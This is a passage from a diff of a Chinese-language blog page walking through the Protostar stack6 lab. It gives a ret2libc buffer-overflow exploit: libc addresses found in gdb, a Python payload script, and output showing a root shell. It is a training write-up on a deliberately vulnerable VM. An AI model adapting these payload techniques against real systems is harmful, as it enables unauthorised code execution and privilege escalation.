+</span></span><span style="display:flex;"><span>	 0x8049000  0x804a000     0x1000          <span style="color:#ae81ff">0</span>        /opt/protostar/bin/stack6
+</span></span><span style="display:flex;"><span>	0xb7e96000 0xb7e97000     0x1000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7e97000 0xb7fd5000   0x13e000          <span style="color:#ae81ff">0</span>         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd9000 0xb7fdc000     0x3000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7fe0000 0xb7fe2000     0x2000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7fe2000 0xb7fe3000     0x1000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	0xb7fe3000 0xb7ffe000    0x1b000          <span style="color:#ae81ff">0</span>         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xbffeb000 0xc0000000    0x15000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>可见 <code>/lib/libc-2.11.2.so</code> 的 <code>Start Addr</code> 是 <code>0xb7e97000</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0xb7e97000+0x11f3bf
+</span></span><span style="display:flex;"><span>0xb7fb63bf:	 <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span></code></pre></div><p>那么</p>
+<p><code>&lt;__libc_system&gt;</code>: <code>0xb7ecffb0</code></p>
+<p><code>/bin/sh</code>: <code>0xb7fb63bf</code></p>
+<p>再回顾一下：</p>
+<table>
+<thead>
+<tr>
+<th>正常情况下在一个函数看来栈的布局</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>[higher memory]</em></td>
+</tr>
+<tr>
+<td>caller&rsquo;s frame</td>
+</tr>
+<tr>
+<td>argument passed by the caller</td>
+</tr>
+<tr>
+<td>return address</td>
+</tr>
+<tr>
+<td>saved ebp</td>
+</tr>
+<tr>
+<td>local variable 1 ☜ ebp</td>
+</tr>
+<tr>
+<td>local variable 2</td>
+</tr>
+<tr>
+<td>local variable 3 ☜ esp</td>
+</tr>
+<tr>
+<td><em>[lower memory]</em></td>
+</tr>
+</tbody>
+</table>
+<p>我们并非通过 Call 来到达 System 的，而是直接跳过去的，</p>
+<p>所以必须得把栈变成上面的形状才能正常正常运行</p>
+<p>这里使用的是 <a class="link" href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"  target="_blank" rel="noopener"
+    >☞ cdecl 调用公约</a></p>
+<p>其中，<code>/bin/sh</code>: <code>0xb7fb63bf</code> 这个地址就是 System 的参数，也就是一个字符串的地址</p>
+<p>但是还需要另一个参数，是 System 执行完成后的返回地址（这个地址可以乱写，但不能没有）</p>
+<p>（system 把参数的字符串当成 shell command 来执行）</p>
+<table>
+<thead>
+<tr>
+<th>对应一下：</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>[higher memory]</em></td>
+<td></td>
+</tr>
+<tr>
+<td>caller&rsquo;s frame</td>
+<td></td>
+</tr>
+<tr>
+<td>argument passed by the caller</td>
+<td>☜  return_addr_after_system +  <code>/bin/sh</code>: <code>0xb7fb63bf</code></td>
+</tr>
+<tr>
+<td>return address</td>
+<td>☜ <code>&lt;__libc_system&gt;</code>: <code>0xb7ecffb0</code></td>
+</tr>
+<tr>
+<td>saved ebp</td>
+<td>☜ we dont care</td>
+</tr>
+<tr>
+<td>local variable 1 ☜ ebp</td>
+<td></td>
+</tr>
+<tr>
+<td>local variable 2</td>
+<td></td>
+</tr>
+<tr>
+<td>local variable 3 ☜ esp</td>
+<td>☜ buffer overflow begins</td>
+</tr>
+<tr>
+<td><em>[lower memory]</em></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>可以试试了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># stack6_1.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT&#34;</span>
+</span></span><span style="display:flex;"><span>libc_system <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xb7ecffb0</span>)
+</span></span><span style="display:flex;"><span>return_addr_after_system <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAA&#34;</span>
+</span></span><span style="display:flex;"><span>bin_sh_addr <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>, <span style="color:#ae81ff">0xb7fb63bf</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print (padding <span style="color:#f92672">+</span> libc_system <span style="color:#f92672">+</span> return_addr_after_system <span style="color:#f92672">+</span> bin_sh_addr)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ python stack6_1.py | /opt/protostar/bin/stack6
+</span></span><span style="display:flex;"><span>input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c??
+</span></span><span style="display:flex;"><span>Segmentation fault
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@protostar:/tmp$
+</span></span></code></pre></div><p>为什么就没有了呢，怎么会是呢</p>
+<p>实际上确实已经有一个 <code>/bin/sh</code> 生成了，可是还什么都没输入就退出了</p>
+<p>这时候可以使用 cat</p>
+<p><figure style="flex-grow: 80; flex-basis: 192px">
+		<a href="/p/protostar_stack_4-7/cat.jpeg" data-size="201x251"><img src="/p/protostar_stack_4-7/cat.jpeg"
+				srcset="/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_480x0_resize_q75_box.jpeg 480w, /p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_1024x0_resize_q75_box.jpeg 1024w"
+				width="201"
+				height="251"
+				loading="lazy"
+				>
+		</a>
+		
+	</figure></p>
+<p>直接执行 cat 的话，效果是复读</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ cat
+</span></span><span style="display:flex;"><span>Hello
+</span></span><span style="display:flex;"><span>Hello
+</span></span><span style="display:flex;"><span>Hey
+</span></span><span style="display:flex;"><span>Hey
+</span></span><span style="display:flex;"><span>Minty daisuki x
+</span></span><span style="display:flex;"><span>Minty daisuki x
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@protostar:/tmp$
+</span></span></code></pre></div><p>把命令改成这样可以保证 shell 一直打开，并通过管道来重定向输入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>python stack6_1.py; cat<span style="color:#f92672">)</span> | /opt/protostar/bin/stack6
+</span></span></code></pre></div><p>试一下的话</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ <span style="color:#f92672">(</span>python stack6_1.py; cat<span style="color:#f92672">)</span> | /opt/protostar/bin/stack6
+</span></span><span style="display:flex;"><span>input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c??
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>ls /
+</span></span><span style="display:flex;"><span>bin  boot  dev	etc  home  initrd.img  lib  live  lost+found  media  mnt  opt  proc  sbin  selinux  srv  sys  tmp  usr	var  vmlinuz
+</span></span></code></pre></div><p>成功w</p>
+<hr />
+<h2 id="stack-seven">Stack Seven</h2>
+<p>晚点再总结&hellip;</p>
 
 </section>
 
@@ -563,6 +950,44 @@ XR 和 XS 的价格都在 2500 左右，<br>
             >
 
             </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#protostar">Protostar</a></li>
+    <li><a href="#shell-storm">shell-storm</a></li>
+    <li><a href="#乱七八糟的笔记">乱七八糟的笔记</a></li>
+    <li><a href="#stack-zero--three">Stack Zero ~ Three</a></li>
+    <li><a href="#stack-four">Stack Four</a></li>
+    <li><a href="#stack-five">Stack Five</a></li>
+    <li><a href="#stack-six">Stack Six</a>
+      <ul>
+        <li><a href="#exploit-0--ret2ret">exploit #0 : ret2ret</a></li>
+        <li><a href="#exploit-1--ret2libc">exploit #1 : ret2libc</a></li>
+      </ul>
+    </li>
+    <li><a href="#stack-seven">Stack Seven</a></li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
     
 
         </div>
